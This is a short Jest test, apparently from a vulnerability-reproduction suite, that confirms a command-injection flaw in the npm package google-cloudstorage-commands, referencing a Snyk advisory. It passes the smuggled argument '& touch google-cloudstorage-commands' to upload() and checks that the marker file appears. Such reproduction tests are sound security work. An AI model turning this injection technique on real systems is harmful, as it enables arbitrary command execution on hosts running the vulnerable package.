//https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431
test("Command Injection in google-cloudstorage-commands", () => {
  expect.assertions(2);
  var root = require("google-cloudstorage-commands");
  const fs = require("fs");
  const path = "./google-cloudstorage-commands";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root
    .upload("./", "& touch google-cloudstorage-commands", true)
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
